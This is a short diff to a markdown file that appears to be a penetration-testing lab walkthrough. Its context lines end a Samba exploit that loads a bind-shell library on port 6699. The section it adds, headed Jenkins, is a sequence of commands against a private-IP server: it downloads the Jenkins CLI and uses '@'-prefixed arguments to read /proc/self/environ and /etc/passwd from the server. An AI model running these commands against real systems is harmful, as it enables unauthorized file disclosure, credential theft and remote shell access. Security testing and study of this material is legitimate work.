@@ -113,5 +113,14 @@ cd /opt
   -r /home/share/libbindshell-samba.so \
   -u guest -p guest \
   -P 6699
+```
 
+### 5. Jenkins
+```bash
+curl -I http://172.20.0.105:8080/
+cd /tmp
+wget http://172.20.0.105:8080/jnlpJars/jenkins-cli.jar
+file jenkins-cli.jar
+java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http help "@/proc/self/environ"
+java -jar jenkins-cli.jar -s http://172.20.0.105:8080/ -http connect-node "@/etc/passwd"
 ```
